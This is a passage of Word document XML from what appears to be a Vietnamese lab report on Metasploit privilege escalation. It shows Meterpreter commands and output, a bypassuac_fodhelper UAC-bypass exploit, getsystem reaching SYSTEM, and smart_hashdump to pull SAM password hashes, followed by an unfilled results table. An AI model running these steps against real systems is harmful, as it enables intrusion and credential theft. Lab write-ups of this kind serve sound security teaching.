        <w:t>Server username: DESKTOP-L2GFPNA\duc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4883813A" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Meterpreter đang chạy với quyền người dùng thông thường. Kiểm tra bằng lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7801668F" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>run post/windows/gather/smart_hashdump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C869A4" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>[*] Running module against DESKTOP-L2GFPNA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[*] Hashes will be saved to the database if one is connected.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[+] Hashes will be saved in loot in JtR password file format to:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[-] Insufficient privileges to dump hashes!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B89B5C8" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Thử nâng quyền bằng getsystem:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0FA781" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>getsystem -t 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C99BE6D" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>meterpreter &gt; getsystem -t 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[-] Named Pipe Impersonation (In Memory/Admin)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6587CF26" w14:textId="206EC185" w:rsidR="0010582E" w:rsidRDefault="000F1C5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5402C77C" wp14:editId="6711E0C6">
            <wp:extent cx="6332220" cy="2614295"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="39959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994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3.6. Perform Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2622D20D" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Đưa Meterpreter session hiện tại về nền:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E1101F" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>background</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75342F1A" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Sử dụng exploit bypassuac_fodhelper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E000156" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>use exploit/windows/local/bypassuac_fodhelper</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11403B0E" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Xem tùy chọn, kiểm tra ID session cũ và đặt session cho exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68263078" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1E6821" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sessions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558D691E" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>set SESSION &lt;ID&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D068768" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Thực thi exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E855CA5" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C4C298" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Kiểm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> tra User ID của Meterpreter session mới:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246A4758" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>getuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3FB3D8" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>meterpreter &gt; getuid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>Server username: DESKTOP-L2GFPNA\duc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E313C6" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Chạy lại getsystem theo tài liệu GitHub:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7A7682" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>getsystem -i 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3121426D" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>meterpreter &gt; getsystem -i 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FE2A55" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Kiểm tra lại User ID:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AAFDCF" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>getuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D7BC80" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>meterpreter &gt; getuid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>Server username: NT AUTHORITY\SYSTEM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="69674D38" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Thử lấy hash trong SAM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0A4B90" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>run post/windows/gather/smart_hashdump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D791608" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Kết quả thực tế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10582E" w14:paraId="221FC5DA" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="294F3EAC" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Nội dung kiểm tra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6024196F" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Kết quả thực tế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63F0A611" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Nhận xét</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="49AC1BEF" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37F5F059" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Tạo Exploit.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="711249FD" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="65AD6FEF" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="68E1AD8F" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6AB8802E" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Apache và thư mục share</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="431A552E" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="644291D6" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="19F162AA" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="34CC3997" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Meterpreter session</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="19CA2C40" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền session ID]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7C105748" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="7C5E19B9" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5C62D0D3" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Quyền ban đầu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55F209EA" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả getuid]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="417338FD" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="19A2E961" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="410DC9EA" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>smart_hashdump ban đầu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4907EBA7" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4FE830BF" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="5BACBBC9" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="19DFE77C" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>getsystem lần đầu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3DC05132" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15F7BA24" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="4E2C2D7F" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0CACFD84" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>bypassuac_fodhelper</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="63866F37" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37658F03" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="265E4D3B" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0FDA3EF3" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Quyền sau nâng cấp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="42ADB3A3" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả getuid]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1CD1595F" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="1048F6D7" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0AC5A15C" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>smart_hashdump sau nâng quyền</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5ACC007D" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền kết quả]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3118" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5F3BB2D8" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>[Điền nhận xét]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A325EEF" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="0010582E"/>
    <w:sectPr w:rsidR="0010582E" w:rsidSect="00034616">
      <w:footerReference w:type="default" r:id="rId15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BE58E" w14:textId="77777777" w:rsidR="001F17E5" w:rsidRDefault="001F17E5">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
